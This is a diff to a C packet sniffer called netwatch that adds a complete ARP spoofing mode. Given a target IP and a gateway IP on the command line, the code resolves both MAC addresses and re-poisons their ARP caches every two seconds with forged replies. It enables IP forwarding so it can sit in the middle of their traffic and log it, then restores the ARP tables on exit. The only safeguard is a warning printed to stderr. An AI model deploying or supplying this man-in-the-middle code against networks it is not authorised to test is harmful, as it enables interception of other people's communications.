@@ -14,9 +14,14 @@
 #include <net/if.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <sys/ioctl.h>
+#include <linux/if_arp.h>
+#include <signal.h>
+#include <errno.h>
 
 // ===================== config and data types =====================
 
+#define IFNAME "wlp0s20f3"
 #define MAX_DUMP 256
 #define CH_MAX 4096
 #define MAX_HOSTS 256
@@ -52,6 +57,22 @@ struct host_stat{
 static struct host_stat hosts[MAX_HOSTS];
 static size_t nhosts;
 
+// ===================== ARP spoofing config =====================
+
+struct arp_spoof_ctx {
+    int sockfd;                    // raw socket (ETH_P_ARP) for sending
+    unsigned char our_mac[6];      // this machine's MAC
+    unsigned char our_ip[4];       // this machine's IPv4
+    unsigned char target_mac[6];   // target device's MAC (resolved)
+    unsigned char target_ip[4];    // target device's IPv4 (from CLI)
+    unsigned char gateway_mac[6];  // gateway's MAC (resolved)
+    unsigned char gateway_ip[4];   // gateway's IPv4 (from CLI)
+    int active;                    // 1 while spoofing, 0 to stop
+};
+
+static struct arp_spoof_ctx spoof_ctx;
+static volatile sig_atomic_t running = 1;
+
 // ===================== helpers: byte readers =====================
 
 static uint16_t rd16(const unsigned char *p){ return (p[0] << 8) | p[1]; }
@@ -82,6 +103,187 @@ ssize_t recieve_packet(int sockfd, unsigned char *buf, size_t size){
     );
     if(rec == -1) {perror("recvfrom");}
     return rec;
+}
+// ===================== ARP spoofing =====================
+
+static int get_own_mac(const char *ifname, unsigned char *mac) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) { perror("socket (get_own_mac)"); return 0; }
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof ifr);
+    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
+
+    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
+        perror("ioctl SIOCGIFHWADDR"); close(fd); return 0;
+    }
+    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+    close(fd);
+    return 1;
+}
+
+static int get_own_ip(const char *ifname, unsigned char *ip) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) { perror("socket (get_own_ip)"); return 0; }
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof ifr);
+    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
+
+    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
+        perror("ioctl SIOCGIFADDR"); close(fd); return 0;
+    }
+    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
+    memcpy(ip, &sin->sin_addr.s_addr, 4);
+    close(fd);
+    return 1;
+}
+
+static int parse_ipv4(const char *s, unsigned char *ip) {
+    struct in_addr addr;
+    if (inet_pton(AF_INET, s, &addr) != 1) return 0;
+    memcpy(ip, &addr.s_addr, 4);
+    return 1;
+}
+
+static int arp_resolve(int sockfd, int ifindex,
+                       const unsigned char *our_mac, const unsigned char *our_ip,
+                       const unsigned char *target_ip, unsigned char *target_mac) {
+    // Build an ARP request (42 bytes: 14 ethernet + 28 ARP)
+    unsigned char pkt[42];
+    memset(pkt, 0, sizeof pkt);
+
+    // Ethernet header: broadcast destination
+    memset(pkt, 0xff, 6);                          // dst: ff:ff:ff:ff:ff:ff
+    memcpy(pkt + 6, our_mac, 6);                   // src: our MAC
+    pkt[12] = 0x08; pkt[13] = 0x06;                // EtherType: ARP
+
+    // ARP header
+    pkt[14] = 0x00; pkt[15] = 0x01;                // hardware type: Ethernet
+    pkt[16] = 0x08; pkt[17] = 0x00;                // protocol type: IPv4
+    pkt[18] = 6;                                    // hardware size
+    pkt[19] = 4;                                    // protocol size
+    pkt[20] = 0x00; pkt[21] = 0x01;                // opcode: request (1)
+
+    memcpy(pkt + 22, our_mac, 6);                  // sender MAC
+    memcpy(pkt + 28, our_ip, 4);                    // sender IP
+    // target MAC: 00:00:00:00:00:00 (unknown)
+    memcpy(pkt + 38, target_ip, 4);                 // target IP
+
+    // Send via AF_PACKET
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof addr);
+    addr.sll_family   = AF_PACKET;
+    addr.sll_ifindex  = ifindex;
+    addr.sll_halen    = 6;
+    memset(addr.sll_addr, 0xff, 6);
+
+    if (sendto(sockfd, pkt, 42, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
+        perror("sendto (arp_resolve)"); return 0;
+    }
+
+    // Wait for the reply (up to 3 seconds)
+    struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
+    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
+
+    unsigned char buf[128];
+    for (int tries = 0; tries < 50; tries++) {
+        ssize_t n = recvfrom(sockfd, buf, sizeof buf, 0, NULL, NULL);
+        if (n < 42) continue;
+        // Check: EtherType ARP, opcode reply, sender IP matches target
+        if (buf[12] != 0x08 || buf[13] != 0x06) continue;
+        if (buf[20] != 0x00 || buf[21] != 0x02) continue;      // opcode 2 = reply
+        if (memcmp(buf + 28, target_ip, 4) != 0) continue;     // sender IP
+        memcpy(target_mac, buf + 22, 6);                         // sender MAC
+        return 1;
+    }
+    fprintf(stderr, "arp_resolve: no reply from %u.%u.%u.%u\n",
+            target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
+    return 0;
+}
+
+static int arp_send_reply(int sockfd, int ifindex,
+                          const unsigned char *src_mac, const unsigned char *src_ip,
+                          const unsigned char *dst_mac, const unsigned char *dst_ip) {
+    unsigned char pkt[42];
+    memset(pkt, 0, sizeof pkt);
+
+    // Ethernet: unicast to the victim
+    memcpy(pkt,     dst_mac, 6);                   // dst: victim's real MAC
+    memcpy(pkt + 6, src_mac, 6);                   // src: our MAC
+    pkt[12] = 0x08; pkt[13] = 0x06;                // EtherType: ARP
+
+    // ARP payload: "I am <spoofed_ip> at <our_mac>"
+    pkt[14] = 0x00; pkt[15] = 0x01;                // hardware type: Ethernet
+    pkt[16] = 0x08; pkt[17] = 0x00;                // protocol type: IPv4
+    pkt[18] = 6; pkt[19] = 4;                      // sizes
+    pkt[20] = 0x00; pkt[21] = 0x02;                // opcode: reply (2)
+
+    memcpy(pkt + 22, src_mac, 6);                  // sender MAC (us — the lie)
+    memcpy(pkt + 28, src_ip, 4);                    // sender IP (the spoofed IP — the lie)
+    memcpy(pkt + 32, dst_mac, 6);                  // target MAC (victim's real MAC)
+    memcpy(pkt + 38, dst_ip, 4);                    // target IP (victim's real IP)
+
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof addr);
+    addr.sll_family   = AF_PACKET;
+    addr.sll_ifindex  = ifindex;
+    addr.sll_halen    = 6;
+    memcpy(addr.sll_addr, dst_mac, 6);
+
+    if (sendto(sockfd, pkt, 42, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
+        perror("sendto (arp_send_reply)"); return 0;
+    }
+    return 1;
+}
+
+static void arp_restore(struct arp_spoof_ctx *ctx, int ifindex) {
+    fprintf(stderr, "\n[arp] restoring ARP tables...\n");
+    for (int i = 0; i < 5; i++) {
+        // Tell the target: gateway_ip is at gateway_mac (the truth)
+        arp_send_reply(ctx->sockfd, ifindex,
+                       ctx->gateway_mac, ctx->gateway_ip,
+                       ctx->target_mac,  ctx->target_ip);
+        // Tell the gateway: target_ip is at target_mac (the truth)
+        arp_send_reply(ctx->sockfd, ifindex,
+                       ctx->target_mac,  ctx->target_ip,
+                       ctx->gateway_mac, ctx->gateway_ip);
+        usleep(500000);   // 0.5 second between bursts
+    }
+    fprintf(stderr, "[arp] restore done\n");
+}
+
+static void arp_spoof_tick(struct arp_spoof_ctx *ctx, int ifindex) {
+    // Tell the target: "gateway IP is at our MAC"
+    arp_send_reply(ctx->sockfd, ifindex,
+                   ctx->our_mac,    ctx->gateway_ip,
+                   ctx->target_mac, ctx->target_ip);
+    // Tell the gateway: "target IP is at our MAC"
+    arp_send_reply(ctx->sockfd, ifindex,
+                   ctx->our_mac,    ctx->target_ip,
+                   ctx->gateway_mac, ctx->gateway_ip);
+}
+
+static int enable_ip_forward(void) {
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+    if (!f) { perror("ip_forward"); return 0; }
+    fprintf(f, "1\n");
+    fclose(f);
+    fprintf(stderr, "[arp] IPv4 forwarding enabled\n");
+    return 1;
+}
+
+static void disable_ip_forward(void) {
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+    if (!f) return;
+    fprintf(f, "0\n");
+    fclose(f);
+    fprintf(stderr, "[arp] IPv4 forwarding disabled\n");
+}
+
+static void sigint_handler(int sig) {
+    (void)sig;
+    running = 0;
 }
 // ===================== output helpers =====================
 
@@ -527,24 +729,120 @@ void log_packet(FILE *f, const unsigned char *buf, ssize_t rec){
 }
 // ===================== main =====================
 
-int main(void){
-    int sockfd = open_raw_socket("wlp0s20f3");
-    if(sockfd == -1) return 1;
+int main(int argc, char *argv[]) {
+    int do_spoof = 0;
+    const char *target_ip_str = NULL;
+    const char *gateway_ip_str = NULL;
+
+    // Simple argument parsing: ./netwatch --spoof <target-ip> <gateway-ip>
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "--spoof") == 0 && i + 2 < argc) {
+            target_ip_str  = argv[++i];
+            gateway_ip_str = argv[++i];
+            do_spoof = 1;
+        }
+    }
+
+    signal(SIGINT, sigint_handler);
+
+    int sockfd = open_raw_socket(IFNAME);
+    if (sockfd == -1) return 1;
+
+    int ifindex = (int)if_nametoindex(IFNAME);
+
+    // --- ARP spoof setup ---
+    int arp_sockfd = -1;
+    if (do_spoof) {
+        fprintf(stderr,
+            "=== WARNING ===\n"
+            "ARP spoofing mode. Use only on YOUR OWN network\n"
+            "against YOUR OWN devices.\n"
+            "===============\n\n");
+
+        if (!parse_ipv4(target_ip_str, spoof_ctx.target_ip)) {
+            fprintf(stderr, "bad target IP: %s\n", target_ip_str); return 1;
+        }
+        if (!parse_ipv4(gateway_ip_str, spoof_ctx.gateway_ip)) {
+            fprintf(stderr, "bad gateway IP: %s\n", gateway_ip_str); return 1;
+        }
+        if (!get_own_mac(IFNAME, spoof_ctx.our_mac)) return 1;
+        if (!get_own_ip(IFNAME, spoof_ctx.our_ip))   return 1;
+
+        fprintf(stderr, "[arp] our MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                spoof_ctx.our_mac[0], spoof_ctx.our_mac[1], spoof_ctx.our_mac[2],
+                spoof_ctx.our_mac[3], spoof_ctx.our_mac[4], spoof_ctx.our_mac[5]);
+        fprintf(stderr, "[arp] our IP:  %u.%u.%u.%u\n",
+                spoof_ctx.our_ip[0], spoof_ctx.our_ip[1],
+                spoof_ctx.our_ip[2], spoof_ctx.our_ip[3]);
+
+        // Open a separate socket for ARP send/recv
+        arp_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+        if (arp_sockfd < 0) { perror("socket (ARP)"); return 1; }
+        spoof_ctx.sockfd = arp_sockfd;
+
+        // Resolve the gateway's real MAC
+        fprintf(stderr, "[arp] resolving gateway %s ...\n", gateway_ip_str);
+        if (!arp_resolve(arp_sockfd, ifindex, spoof_ctx.our_mac,
+                         spoof_ctx.our_ip, spoof_ctx.gateway_ip,
+                         spoof_ctx.gateway_mac)) {
+            fprintf(stderr, "could not resolve gateway MAC\n"); return 1;
+        }
+        fprintf(stderr, "[arp] gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                spoof_ctx.gateway_mac[0], spoof_ctx.gateway_mac[1],
+                spoof_ctx.gateway_mac[2], spoof_ctx.gateway_mac[3],
+                spoof_ctx.gateway_mac[4], spoof_ctx.gateway_mac[5]);
+
+        // Resolve the target's real MAC
+        fprintf(stderr, "[arp] resolving target %s ...\n", target_ip_str);
+        if (!arp_resolve(arp_sockfd, ifindex, spoof_ctx.our_mac,
+                         spoof_ctx.our_ip, spoof_ctx.target_ip,
+                         spoof_ctx.target_mac)) {
+            fprintf(stderr, "could not resolve target MAC\n"); return 1;
+        }
+        fprintf(stderr, "[arp] target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                spoof_ctx.target_mac[0], spoof_ctx.target_mac[1],
+                spoof_ctx.target_mac[2], spoof_ctx.target_mac[3],
+                spoof_ctx.target_mac[4], spoof_ctx.target_mac[5]);
+
+        // Enable IP forwarding so we don't black-hole traffic
+        if (!enable_ip_forward()) return 1;
+
+        spoof_ctx.active = 1;
+        fprintf(stderr, "[arp] spoofing started — press Ctrl+C to stop and restore\n\n");
+    }
 
     FILE *logfile = fopen("netwatch.log", "w");
-    if(!logfile){perror("fopen"); return 1;}
+    if (!logfile) { perror("fopen"); return 1; }
     setvbuf(logfile, NULL, _IOLBF, 0);
 
     unsigned char buffer[65535];
-
     time_t last_print = time(NULL);
-    while(1){
-        ssize_t rec = recieve_packet(sockfd, buffer, sizeof(buffer));  
-        if (rec == -1) continue; 
+    time_t last_spoof = 0;
+
+    while (running) {
+        ssize_t rec = recieve_packet(sockfd, buffer, sizeof(buffer));
+        if (rec == -1) continue;
         log_packet(logfile, buffer, rec);
 
         time_t now = time(NULL);
-        if(now - last_print > 10){ stats_print(stdout); last_print = now; }
+        if (now - last_print > 10) { stats_print(stdout); last_print = now; }
+
+        // Re-poison every 2 seconds
+        if (do_spoof && spoof_ctx.active && now - last_spoof >= 2) {
+            arp_spoof_tick(&spoof_ctx, ifindex);
+            last_spoof = now;
+        }
     }
+
+    // --- Cleanup ---
+    if (do_spoof && spoof_ctx.active) {
+        arp_restore(&spoof_ctx, ifindex);
+        disable_ip_forward();
+        close(arp_sockfd);
+    }
+
+    fclose(logfile);
+    close(sockfd);
+    fprintf(stderr, "[netwatch] clean shutdown\n");
     return 0;
 }
